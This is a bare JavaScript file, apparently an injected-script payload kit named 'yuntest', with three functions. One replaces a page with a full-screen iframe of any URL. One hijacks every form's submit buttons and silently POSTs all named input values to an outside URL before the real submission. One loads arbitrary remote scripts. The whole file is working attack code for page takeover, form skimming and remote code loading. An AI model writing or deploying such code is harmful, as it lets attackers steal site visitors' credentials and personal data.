yuntest = {
    'iframe': function (url = null, title = null) {
    	if(!url){
    		return false;
    	}
    	if (title) {
    		document.title = title;
    	}
		var ifDom = document.createElement("iframe");
		ifDom.src = url;
		ifDom.height = "100%";
		ifDom.width = "100%";
		ifDom.frameborder="no" ;
		ifDom.border="0" ;
		ifDom.marginwidth="0" ;
		ifDom.marginheight="0";
		ifDom.style="position:absolute;top:0px;left:0px;width:100%;height:100%;overflow:hidden;padding:-1px;margin:-1px";
		document.getElementsByTagName("body")[0].innerHTML="";
		document.querySelector('body').appendChild(ifDom);
    },
    'monitorForm':function(url){
    	var form = document.getElementsByTagName("form");
    	var getParam = function(){
    		var param = "";
    		for(var i=0;i<form.length;i++){
	    		for(var j=0;j<form[i].length;j++){
	    			if(form[i][j].localName === "input"){
	    				for(var k=0;k<form[i][j].attributes.length;k++){
	    					if(form[i][j].attributes[k].name === "name"){
	    						param += form[i][j].attributes[k].value + "=" +document.getElementsByName(form[i][j].attributes[k].value)[0].value + "&";
	    					}
	    				}
	    			}
	    		}
	    	}
	    	return param;
    	};
    	for(var i=0;i<form.length;i++){
    		for(var j=0;j<form[i].length;j++){
    			if(form[i][j].localName === "button"){
    				for(var k=0;k<form[i][j].attributes.length;k++){
    					if(form[i][j].attributes[k].name === "type"){
    						form[i][j].attributes[k].value = "button";
    						var inForm = form[i];
    						form[i][j].onclick=function(){
    							var xhr = new XMLHttpRequest();
								xhr.open("post",url,true);
								xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
								xhr.send(getParam());
								xhr.onreadystatechange=function(){
									inForm.submit();
									if(xhr.readyState == 4 && xhr.status == 200){
										form[i].submit();
									}
								};

    						}
    					}
    				}
    			}
    		}
    	}
    },
    'useJs': function (url){
    	if(!url){
    		return false;
    	}else{
    		var jsDom = document.createElement("script");
			jsDom.src = url;
			document.querySelector('head').appendChild(jsDom);
    	}
    }
};